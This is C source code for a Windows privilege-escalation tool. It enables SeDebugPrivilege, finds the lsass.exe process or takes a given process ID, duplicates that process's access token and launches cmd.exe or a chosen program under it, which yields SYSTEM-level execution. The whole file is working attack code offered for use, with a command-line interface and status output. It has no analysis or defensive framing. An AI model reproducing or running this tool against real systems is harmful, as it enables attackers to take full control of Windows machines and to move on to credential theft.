#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>

#define PID_AUTO_SEARCH (DWORD)-2
#define SYSTEM_DEFAULT_CMD L"C:\\Windows\\System32\\cmd.exe"

#define DBG(X) do { if(DebugMode) { X; } } while (0);
DWORD DebugMode = 0;

BOOL CheckWindowsPrivilege(WCHAR *Privilege)
{
	/* Checks for Privilege and returns True or False. */
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	if (!LookupPrivilegeValueW(NULL, Privilege, &luid))
		return FALSE;

	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	TOKEN_PRIVILEGES privs_set;
	privs_set.PrivilegeCount = 1;
	privs_set.Privileges[0].Luid = luid;
	privs_set.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if(!AdjustTokenPrivileges(hToken, FALSE, &privs_set, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		return FALSE;

	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

HANDLE GetAccessToken(DWORD pid)
{
	HANDLE currentProcess;
	HANDLE AccessToken;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			wprintf(L"[-] OpenProcess failed: %d\n", GetLastError());
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		wprintf(L"[-] OpenProcessToken failed: %d\n", GetLastError());
		return (HANDLE)NULL;
	}
	return AccessToken;
}

DWORD find_pid(LPCWSTR procname, DWORD *pids, DWORD cap)
{
	DWORD pid_list[1024], pid_count;
	memset(pid_list, 0xff, sizeof(pid_list));

	if(EnumProcesses(pid_list, sizeof(pid_list), &pid_count) == FALSE) {
		return 0;
	}

	pid_count /= sizeof(DWORD);

	DWORD count = 0;

	for(int i = 0; i < pid_count; i++) {
		WCHAR modulename[260];
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid_list[i]);

		if(!hProcess) {
			DBG(wprintf(L"[*] Found pid = %d, but can not OpenProcess\n", pid_list[i]));
			continue;
		}

		DBG(wprintf(L"[*] Found pid = %d", pid_list[i]));

		if(GetModuleFileNameExW(hProcess, NULL, modulename, sizeof(modulename) / sizeof(WCHAR))) {
			LPCWSTR p = wcsrchr(modulename, '\\');
			p = p ? p + 1 : modulename;
			DBG(wprintf(L", with module path \"%ls\" and name \"%ls\"", modulename, p));
			if(wcsicmp(p, procname) == 0) {
				pids[count++] = pid_list[i];
				DBG(wprintf(L" <<< MATCH"));
			}
		}

		DBG(putchar('\n'));

		CloseHandle(hProcess);

		if(count >= cap)
			break;
	}

	return count;
}

void pause_exit(int code)
{
	DBG(getchar());
	exit(code);
}

DWORD run_with(DWORD pid, LPCWSTR execfile, LPWSTR cmdline)
{
	// Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(pid);

	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE NewToken;
	if(!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &NewToken))
	{
		wprintf(L"[-] DuplicateTokenEx failed: %d\n", GetLastError());
		return FALSE;
	}
	DBG(wprintf(L"[+] Process token has been duplicated.\n"));

	/* Starts a new process with SYSTEM token */
	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;
	ret = CreateProcessWithTokenW(NewToken, LOGON_NETCREDENTIALS_ONLY, execfile, cmdline, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret)
	{
		wprintf(L"[-] CreateProcessWithTokenW failed: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int wparse_int(const wchar_t * str) {
	if(wcsncmp(str, L"0x", 2) == 0) {
		return wcstol(str + 2, 0, 16);
	} else {
		return wcstol(str, 0, 10);
	}
}

void usage(wchar_t *argv[])
{
	wprintf(L"Usage: %s [options]\n", argv[0]);
	wprintf(L"  -p pid\n");
	wprintf(L"  -d (enable debug mode)\n");
	wprintf(L"  -f file-to-execute.exe\n");
	wprintf(L"  -c \"echo Command executed with cmd.exe && pause\"\n");
}

int wmain(int argc, wchar_t *argv[])
{
	if(getenv("DEBUG")) DebugMode = 1;

	DWORD target_pid = PID_AUTO_SEARCH;
	LPCWSTR execfile = SYSTEM_DEFAULT_CMD;
	LPWSTR cmdline = NULL;
	WCHAR cmdline_buff[4096];

	for(int i = 1; i < argc; i++) {
		switch(argv[i][0]) {
			case '-':
				switch(argv[i][1]) {
					case 'h':
						usage(argv);
						return 0;
					case 'd':
						DebugMode = 1;
						break;
					case 'p':
						target_pid = wparse_int(argv[i + 1]);
						goto skip_arg;
					case 'c':
						swprintf(cmdline_buff, sizeof(cmdline_buff), L"cmd.exe /c %s", argv[i + 1]);
						execfile = SYSTEM_DEFAULT_CMD;
						cmdline = cmdline_buff;
						goto skip_arg;
					case 'f':
						execfile = argv[i + 1];
						goto skip_arg;
					default:
						goto unkown_opt;
skip_arg:
						i++;
				}
				break;
			default:
unkown_opt:
				wprintf(L"[-] Unknown option %s\n", argv[i]);
				return 1;
		}
	}

	if(!CheckWindowsPrivilege(SE_DEBUG_NAME))
	{
		wprintf(L"[-] I don't have SeDebugPrivilege\n");
	} else {
		DBG(wprintf(L"[*] SeDebugPrivilege granted\n"));
	}

	if (target_pid != PID_AUTO_SEARCH)
	{
		DBG(wprintf(L"[+] Pid Chosen: %d\n", target_pid));
		run_with(target_pid, execfile, cmdline);
	} else {
		BOOL success = FALSE;
		DWORD pids[1024], ret;
		ret = find_pid(L"lsass.exe", pids, sizeof(pids) / sizeof(DWORD));
		DBG(wprintf(L"[*] Found %d process(es) named lsass.exe\n", ret));
		for(DWORD i = 0; i < ret; i++) {
			if(run_with(pids[i], execfile, cmdline)) {
				success = TRUE;
				pause_exit(0);
				break;
			}
		}
		if(!success) {
			pause_exit(1);
		}
	}

}
